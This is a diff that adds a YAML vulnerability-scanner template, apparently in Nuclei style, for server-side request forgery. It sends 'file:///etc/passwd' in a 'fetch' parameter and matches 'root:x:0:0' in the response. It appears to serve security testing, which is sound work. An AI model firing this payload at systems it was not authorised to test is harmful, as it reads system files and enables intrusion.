@@ -1,0 +1,20 @@
+id: patt-ssrf-scheme-file-01-fetch
+name: 'PATT ssrf patt-ssrf-scheme-file-01 via fetch'
+severity: high
+type: active
+tags:
+  - ssrf
+  - patt
+  - schemefile
+description: 'PATT scheme file://. [patt:patt-ssrf-scheme-file-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      fetch:
+        - 'file:///etc/passwd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
